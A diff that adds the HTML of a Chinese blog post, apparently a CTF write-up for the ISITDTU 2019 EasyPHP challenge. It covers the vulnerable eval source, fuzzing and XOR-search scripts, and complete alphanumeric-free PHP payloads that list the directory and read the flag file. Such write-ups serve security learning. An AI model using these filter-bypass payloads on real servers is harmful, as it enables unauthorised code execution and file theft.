@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>ISITDTU2019-EasyPHP - LionTree</title>
+  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=writeup,php>
+  
+  
+  
+    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">LionTree</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/summary" class="menu-item-link">Summary</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/atom.xml" class="menu-item-link">RSS</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">ISITDTU2019-EasyPHP</h1>
+  </div>
+
+  <!-- 文章目录 -->
+  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#可用的内置函数"><span class="toc-text">可用的内置函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#无字母数字webshell"><span class="toc-text">无字母数字webshell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#通过bool得到数字"><span class="toc-text">通过bool得到数字</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#疯狂异或"><span class="toc-text">疯狂异或</span></a></li></ol>
+
+  <div class="post-content">
+    <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$_ = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9\'"`$&amp;.,|[&#123;_defgops\x7F]+/i'</span>, $_) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'rosé will not do it'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'you are so close, omg'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>有两个限制：</p>
+<ul>
+<li>过滤了数字，部分字母和一些特殊符号</li>
+<li>出现的字符不得超过13种</li>
+</ul>
+<h1 id="可用的内置函数"><a href="#可用的内置函数" class="headerlink" title="可用的内置函数"></a>可用的内置函数</h1><p>简单fuzz以下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$functions = get_defined_functions()[<span class="string">'internal'</span>];</span><br><span class="line"><span class="keyword">foreach</span> ($functions <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/[\x00- 0-9\'"`$&amp;.,|[&#123;_defgops\x7F]+/i'</span>, $f)) &#123;</span><br><span class="line">        $reflection = <span class="keyword">new</span> ReflectionFunction($f);</span><br><span class="line">        <span class="keyword">if</span> ($reflection-&gt;getNumberOfRequiredParameters() == <span class="number">1</span>) <span class="comment">//因为,被禁了，所以只能由1个参数</span></span><br><span class="line">            file_put_contents(<span class="string">'1.txt'</span>, $f . <span class="string">"\n"</span>, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">rtrim</span><br><span class="line">trim</span><br><span class="line">ltrim</span><br><span class="line">chr</span><br><span class="line">unlink</span><br><span class="line">tan</span><br><span class="line">atan</span><br><span class="line">atanh</span><br><span class="line">tanh</span><br><span class="line">intval</span><br><span class="line">min</span><br><span class="line">max</span><br></pre></td></tr></table></figure>
+<p>看起来<code>chr</code>比较有搞头，但是<code>.</code>被过滤了，所以即使用chr得到字符也无法拼接起来，更何况数字也全部被过滤了</p>
+<h1 id="无字母数字webshell"><a href="#无字母数字webshell" class="headerlink" title="无字母数字webshell"></a>无字母数字webshell</h1><p>这时可以想到使用无字母数字的webshell，<br>无字母数字webshell主要有三种:</p>
+<ul>
+<li>取反</li>
+<li>异或</li>
+<li>自增</li>
+</ul>
+<p>这里<code>$</code>被禁了，无法使用变量，所以不考虑自增</p>
+<p>使用取反<code>(~%8F%97%8F%96%91%99%90)();</code>得到phpinfo</p>
+<p>可以看到disable_functions把命令执行的函数都禁了，并且存在open_basedir，把目录范围限制在了<code>/var/www/html</code></p>
+<p>在当前的限制条件下，绕过disable_functions和open_basedir显然是不可能的,因此有以下两种思路:</p>
+<ul>
+<li>flag在/flag下，需要写一个完整的shell再去bypass disable_functions或open_basedir</li>
+<li>flag就在/var/www/html,构造一个符合条件的payload去读即可</li>
+</ul>
+<p>无论是哪种，都需要使用尽可能少种类的字符。因为一个字符串取反的值是固定的，而异或可以有很多种可能，所以考虑使用异或</p>
+<h1 id="通过bool得到数字"><a href="#通过bool得到数字" class="headerlink" title="通过bool得到数字"></a>通过bool得到数字</h1><p>这里有一个技巧，构造出bool值再将其转为整型，比如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(!!@a); <span class="comment">//bool(true)</span></span><br><span class="line">var_dump(!!@a+!!@a) <span class="comment">//int(2)</span></span><br></pre></td></tr></table></figure>
+<p>为了构造出大的数字,可以使用次方运算符<code>**</code></p>
+<p>有了这个技巧，我们就可以只用<code>!@a</code>以及运算符号得到任意整型数字</p>
+<p>然而，int和int异或依然是int，并且我们没办法将int按照ascii码转换为字符串(chr只能转换成一个字符，并且这里无法拼接)</p>
+<p>我们需要字符串和字符串异或才能得到一个字符串</p>
+<p>这时可以利用刚刚看起来没卵用的<code>trim</code>将int转换为string，这样我们就可以用<code>!@a</code>以及运算符号得到任意的数字字符串</p>
+<h1 id="疯狂异或"><a href="#疯狂异或" class="headerlink" title="疯狂异或"></a>疯狂异或</h1><p>接下来就要在限定条件内，使用xxx^数字字符串得到我们想要的函数</p>
+<p>第一个目标是<code>var_dump(scandir(getcwd()))</code>,用来确认flag是不是在/var/www/html</p>
+<p>php的函数不分大小写，可以使用大小写混搭的方式</p>
+<p>通过以下脚本去寻找异或</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$targets = <span class="string">'var_dump'</span>;</span><br><span class="line">$numbers = <span class="string">"0123456789"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($j = <span class="number">0</span>; $j&lt;= strlen($numbers); $j++) &#123;</span><br><span class="line">    $number = $numbers[$j];</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= <span class="number">256</span>; $i++) &#123;</span><br><span class="line">        $c = chr($i);</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">'/[\x00- 0-9\'"`$&amp;.,|[&#123;_defgops\x7F]+/i'</span>, $c)) &#123;</span><br><span class="line">            $result = $c ^ $number;</span><br><span class="line">            <span class="keyword">if</span>(stristr($targets,$result) != <span class="keyword">false</span>)</span><br><span class="line">                <span class="keyword">echo</span> urlencode($number) . <span class="string">' '</span> . urlencode($c) . <span class="string">' '</span> . $result . <span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>搞了一万年，终于在限制条件内找到了对应的异或字符串</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Var_dump: <span class="number">75320891</span>^aTAmTMTa</span><br><span class="line">scandir: <span class="number">2757003</span>^aTTyTyA</span><br><span class="line">getcwd: <span class="number">315760</span>^TtaTaT</span><br></pre></td></tr></table></figure>
+<p>这样只需要用到<code>();trim!@a+y</code>12种字符</p>
+<p>再用以下脚本将数字转换为bool值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="number">315760</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">ten = <span class="string">'(!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)'</span> <span class="comment"># 10</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> target !=<span class="number">0</span>:</span><br><span class="line">    current = (int)(target % <span class="number">10</span>)</span><br><span class="line">    <span class="comment"># print(current)</span></span><br><span class="line">    target = (int)(target / <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> current == <span class="number">0</span>:</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># current + 10^i</span></span><br><span class="line">    current_string = <span class="string">'(!!a'</span>+<span class="string">'+!!a'</span>*(current<span class="number">-1</span>) + <span class="string">')'</span></span><br><span class="line">    base_string = <span class="string">'(!!a'</span> + <span class="string">'+!!a'</span>*(i<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">        result = current_string</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        current_string = current_string + <span class="string">'*('</span>+ten+<span class="string">'**'</span>+ base_string +<span class="string">'))'</span></span><br><span class="line">        result = result +<span class="string">'+'</span>+current_string</span><br><span class="line">    <span class="comment"># print(current_string)</span></span><br><span class="line">    i = i+<span class="number">1</span></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
+<p>最后拼出的payload(好可怕。。)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(aTAmTMTa^trim((!!a)+(!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a))+(!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a))+(!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a))+(!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a+!!a))+(!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a+!!a+!!a))+(!!a+!!a+!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a+!!a+!!a+!!a))))((aTTyTyA^trim((!!a+!!a+!!a)+(!!a+!!a+!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a))+(!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a))+(!!a+!!a+!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a+!!a))+(!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a+!!a+!!a))))((TtaTaT^trim((!!a+!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a))+(!!a+!!a+!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a))+(!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a))+(!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a))+(!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a+!!a))))()));</span><br></pre></td></tr></table></figure>
+<p>发现flag就在/var/www/html/</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123; [<span class="number">0</span>]=&gt; string(<span class="number">1</span>) <span class="string">"."</span> [<span class="number">1</span>]=&gt; string(<span class="number">2</span>) <span class="string">".."</span> [<span class="number">2</span>]=&gt; string(<span class="number">9</span>) <span class="string">"index.php"</span> [<span class="number">3</span>]=&gt; string(<span class="number">34</span>) <span class="string">"n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt"</span> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来继续找异或，目标是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(file_get_contents(end(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>
+<p>找到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents: <span class="number">20512315276751752</span>^TyYtmTtamTyyatyaa</span><br><span class="line">end: <span class="number">170</span>^tyT</span><br></pre></td></tr></table></figure>
+<p>没有使用新的字符，最后的payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(aTAmTMTa^trim((!!a)+(!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a))+(!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a))+(!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a))+(!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a+!!a))+(!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a+!!a+!!a))+(!!a+!!a+!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a+!!a+!!a+!!a))))((TyYtmTtamTyyatyaa^trim((!!a+!!a)+(!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a))+(!!a+!!a+!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a))+(!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a))+(!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a))+(!!a+!!a+!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a+!!a))+(!!a+!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a+!!a+!!a))+(!!a+!!a+!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a+!!a+!!a+!!a))+(!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a))+(!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a))+(!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a))+(!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a))+(!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a))+(!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a))+(!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a))+(!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a))))((tyT^trim((!!a+!!a+!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a))+(!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a))))((aTTyTyA^trim((!!a+!!a+!!a)+(!!a+!!a+!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a))+(!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a))+(!!a+!!a+!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a+!!a))+(!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a+!!a+!!a))))((TtaTaT^trim((!!a+!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a))+(!!a+!!a+!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a))+(!!a+!!a+!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a))+(!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a))+(!!a+!!a+!!a)*((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)**(!!a+!!a+!!a+!!a+!!a))))()))));</span><br></pre></td></tr></table></figure>
+
+<p>头都要秃了。。<br>这题还有另外一种解法，通过三个字符串的异或,参见<a href="https://github.com/jesux/ctf-write-ups/tree/master/isitdtu-2019/EasyPHP" target="_blank" rel="noopener">https://github.com/jesux/ctf-write-ups/tree/master/isitdtu-2019/EasyPHP</a></p>
+
+  </div>
+  <div class="post-meta">
+    <span class="post-time" style="color:#646060;font-size:13px">2020-02-19</span>
+  </div>
+
+  <div class="post-footer">
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+
+<!-- 评论插件 -->
+
+<footer>
+  2025
+  <span class="author">
+    LionTree
+  </span>
+</footer>
+
+
+    </div>
+  </body>
+</html>
